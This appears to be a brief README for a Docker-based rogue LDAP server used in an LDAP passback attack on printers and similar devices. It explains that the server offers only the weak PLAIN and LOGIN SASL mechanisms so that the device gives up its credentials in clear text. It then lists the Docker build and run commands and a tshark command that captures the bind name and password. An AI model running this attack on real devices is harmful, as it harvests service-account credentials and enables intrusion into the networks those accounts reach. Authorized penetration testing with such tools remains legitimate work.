# LDAP Passback

In case a printer (or something similar) has an LDAP account, but use the SASL authentication family instead of SIMPLE, the classic LDAP passback exploitation with a nc server will not be sufficient to retrieve the credentials in clear text. Instead, use a custom LDAP server that only offer the weak PLAIN and LOGIN protocols. This Docker permits to operate with weak protocols.

### 1) Setup rogue LDAP server

    docker buildx build -t ldap-passback .
    docker run --rm -ti -p 389:389 ldap-passback

### 2) Listen with tshark to capture plain-text credentials

    tshark -i any -f "port 389" -Y "ldap.protocolOp == 0 && ldap.simple" -e ldap.name -e ldap.simple -Tjson
  
